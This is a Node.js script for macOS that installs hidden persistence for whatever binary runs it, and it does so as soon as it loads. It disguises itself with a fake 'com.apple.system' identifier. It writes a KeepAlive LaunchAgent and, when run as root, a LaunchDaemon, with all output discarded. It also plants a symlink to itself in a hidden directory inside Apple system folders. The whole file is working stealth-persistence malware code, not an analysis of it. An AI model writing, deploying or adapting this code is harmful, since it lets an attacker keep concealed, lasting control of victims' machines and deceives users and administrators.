const { exec } = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');

// Generate a semi-random identifier based on machine + user
function generateStealthIdentifier() {
  const userInfo = os.userInfo();
  const machineId = crypto.createHash('md5').update(
    userInfo.username + os.hostname() + os.platform() + os.release()
  ).digest('hex').slice(0, 16);
  
  return `com.apple.system.${machineId}`;
}

// Use a system-like identifier
const stealthId = generateStealthIdentifier();

// Paths to store the launcher agents and daemons
const launchAgentDir = path.join(os.homedir(), 'Library', 'LaunchAgents');
const launchDaemonDir = '/Library/LaunchDaemons';
const launchAgentFile = path.join(launchAgentDir, `${stealthId}.plist`);
const launchDaemonFile = path.join(launchDaemonDir, `${stealthId}.helper.plist`);

// Get the current app path
const appPath = process.execPath;
const appDirectory = path.dirname(process.execPath);

// Create launch agent for stealth running on login
function createLaunchAgent() {
  try {
    // Make sure directory exists
    if (!fs.existsSync(launchAgentDir)) {
      fs.mkdirSync(launchAgentDir, { recursive: true });
    }

    // Create the plist content
    const plistContent = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${stealthId}</string>
    <key>ProgramArguments</key>
    <array>
        <string>${appPath}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>ProcessType</key>
    <string>Interactive</string>
    <key>LSUIElement</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>ThrottleInterval</key>
    <integer>300</integer>
</dict>
</plist>`;

    // Write to file
    fs.writeFileSync(launchAgentFile, plistContent);

    // Load the agent
    exec(`launchctl load ${launchAgentFile}`, (error) => {
      if (error) {
        console.error('Error loading launch agent:', error);
      } else {
        console.log('Launch agent installed successfully');
      }
    });
    
    return true;
  } catch (error) {
    console.error('Error creating launch agent:', error);
    return false;
  }
}

// Create launch daemon for deeper system persistence (requires sudo)
function createLaunchDaemon() {
  try {
    // Check if we have permission to write to LaunchDaemons
    if (fs.existsSync(launchDaemonDir) && process.getuid() === 0) {
      const daemonPlist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${stealthId}.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>${appPath}</string>
        <string>--system-helper</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>ThrottleInterval</key>
    <integer>60</integer>
    <key>ProcessType</key>
    <string>Background</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>`;

      fs.writeFileSync(launchDaemonFile, daemonPlist);
      
      // Set proper permissions
      exec(`chmod 644 ${launchDaemonFile}`, () => {
        // Load the daemon
        exec(`launchctl load ${launchDaemonFile}`, (error) => {
          if (error) {
            console.error('Error loading launch daemon:', error);
          } else {
            console.log('Launch daemon installed successfully');
          }
        });
      });
      
      return true;
    }
    return false;
  } catch (error) {
    console.error('Error creating launch daemon:', error);
    return false;
  }
}

// Create a hidden helper app alias in system locations
function createSystemAlias() {
  try {
    const systemLocations = [
      '/Library/Application Support/Apple/System',
      '/Library/Preferences/SystemConfiguration',
      '/Library/Caches/com.apple.SystemServices'
    ];
    
    // Choose a random location that exists
    const validLocations = systemLocations.filter(loc => fs.existsSync(loc));
    
    if (validLocations.length > 0) {
      const targetLocation = validLocations[Math.floor(Math.random() * validLocations.length)];
      const helperDir = path.join(targetLocation, '.helpers');
      
      // Create hidden directory if it doesn't exist
      if (!fs.existsSync(helperDir)) {
        try {
          fs.mkdirSync(helperDir, { recursive: true });
          // Hide the directory
          exec(`chflags hidden "${helperDir}"`);
        } catch (error) {
          console.error('Error creating helper directory:', error);
        }
      }
      
      // Create symbolic link
      const linkPath = path.join(helperDir, `${stealthId.split('.').pop()}`);
      exec(`ln -sf "${appPath}" "${linkPath}"`);
    }
  } catch (error) {
    console.error('Error creating system alias:', error);
  }
}

// Install all persistence mechanisms
function installPersistence() {
  const agentCreated = createLaunchAgent();
  const daemonCreated = createLaunchDaemon();
  createSystemAlias();
  
  return agentCreated || daemonCreated;
}

// Run the installation
installPersistence();